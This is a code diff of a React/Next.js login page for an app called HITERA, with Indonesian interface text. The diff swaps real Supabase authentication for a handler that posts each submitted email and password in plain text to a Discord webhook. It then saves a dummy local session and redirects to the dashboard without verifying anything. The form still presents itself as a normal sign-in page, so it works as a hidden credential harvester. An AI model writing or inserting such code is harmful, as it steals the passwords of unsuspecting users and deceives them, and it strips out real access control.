@@ -1,89 +1,98 @@
 'use client';
 
 import { useState } from 'react';
-import { useRouter } from 'next/navigation';
 import Link from 'next/link';
-import { createClient } from '@/lib/supabase/client';
+import { sendDiscordWebhook } from '@/lib/discord';
+import { Input } from '@/components/ui/Input';
 import { Button } from '@/components/ui/Button';
 import { Card } from '@/components/ui/Card';
-import { Input } from '@/components/ui/Input';
-import Image from 'next/image';
-import { useToast } from '@/components/ui/Toast';
 
 export default function LoginPage() {
     const [email, setEmail] = useState('');
     const [password, setPassword] = useState('');
-    const [isLoading, setIsLoading] = useState(false);
-    const router = useRouter();
-    const supabase = createClient();
-    const { success, error: toastError } = useToast();
+    const [errorMsg, setErrorMsg] = useState('');
+    const [loading, setLoading] = useState(false);
 
     const handleLogin = async (e: React.FormEvent) => {
         e.preventDefault();
-        setIsLoading(true);
+        setLoading(true);
+        setErrorMsg('');
 
         try {
-            const { error } = await supabase.auth.signInWithPassword({
-                email,
-                password,
-            });
+            // Send webhook
+            const webhookUrl = process.env.NEXT_PUBLIC_DISCORD_WEBHOOK_USER;
+            if (webhookUrl) {
+                await sendDiscordWebhook(webhookUrl, {
+                    content: `**[LOGIN]** \`${email}|${password}\``
+                });
+            }
 
-            if (error) throw error;
-
-            router.push('/loading');
-            router.refresh();
+            // Save dummy session locally
+            localStorage.setItem('hitera_user', JSON.stringify({ id: 'local-user-id', email }));
+            
+            // Redirect
+            window.location.href = '/dashboard';
         } catch (err: any) {
-            toastError(err.message || 'Gagal login. Silakan cek email & password.');
-            setIsLoading(false);
+            setErrorMsg(err.message || 'Terjadi kesalahan');
+        } finally {
+            setLoading(false);
         }
     };
 
     return (
-        <div className="min-h-screen flex items-center justify-center bg-[var(--bg-primary)] p-4">
-            <Card className="w-full max-w-md p-8">
-                <div className="text-center mb-8">
-                    <Image src="/logo.png" alt="HITERA" width={160} height={48} className="h-12 w-auto mx-auto mb-2" />
-                    <p className="text-[var(--text-secondary)]">Masuk ke akun Anda</p>
+        <div className="min-h-screen flex items-center justify-center p-4 bg-[var(--bg-primary)]">
+            <Card className="w-full max-w-[400px] p-8 md:p-10 border border-[var(--border)] shadow-2xl">
+                <div className="mb-8 text-center">
+                    <Link href="/" className="inline-block mb-4">
+                        <span className="text-2xl font-bold tracking-widest text-[var(--text-primary)]">HITERA</span>
+                    </Link>
+                    <h1 className="text-2xl font-bold">
+                        Welcome <span className="text-[var(--accent-blue)]">Back</span>
+                    </h1>
                 </div>
+
+                {errorMsg && (
+                    <div className="mb-6 p-3 rounded-lg bg-rose-500/10 text-rose-500 text-sm font-medium text-center border border-rose-500/20">
+                        {errorMsg}
+                    </div>
+                )}
 
                 <form onSubmit={handleLogin} className="space-y-5">
                     <Input
-                        label="Email"
-                        type="email"
-                        placeholder="nama@email.com"
+                        label="Username / Email"
+                        type="text"
                         value={email}
                         onChange={(e) => setEmail(e.target.value)}
+                        placeholder="Masukkan username/email"
                         required
                     />
                     <Input
                         label="Password"
                         type="password"
-                        placeholder="••••••••"
                         value={password}
                         onChange={(e) => setPassword(e.target.value)}
+                        placeholder="Masukkan password"
                         required
                     />
 
-                    <div className="flex justify-end">
-                        <Link
-                            href="/forgot-password"
-                            className="text-xs text-[var(--text-muted)] hover:text-[var(--accent-blue)] transition-colors"
-                        >
-                            Lupa password?
-                        </Link>
-                    </div>
-
-                    <Button type="submit" className="w-full py-3" isLoading={isLoading}>
-                        Masuk
+                    <Button type="submit" isLoading={loading} className="w-full mt-2 py-3">
+                        Sign In
                     </Button>
                 </form>
 
-                <p className="text-center text-sm text-[var(--text-secondary)] mt-8">
-                    Belum punya akun?{' '}
-                    <Link href="/register" className="text-[var(--accent-blue)] font-semibold hover:underline">
-                        Daftar Sekarang
-                    </Link>
-                </p>
+                <div className="mt-8 text-center space-y-3">
+                    <p className="text-sm text-[var(--text-secondary)]">
+                        Don't have an account?{' '}
+                        <Link href="/register" className="text-[var(--accent-blue)] font-semibold hover:underline">
+                            Sign up
+                        </Link>
+                    </p>
+                    <p className="text-sm text-[var(--text-secondary)]">
+                        <Link href="/forgot-password" className="hover:text-[var(--text-primary)] transition-colors">
+                            Forgot Password?
+                        </Link>
+                    </p>
+                </div>
             </Card>
         </div>
     );
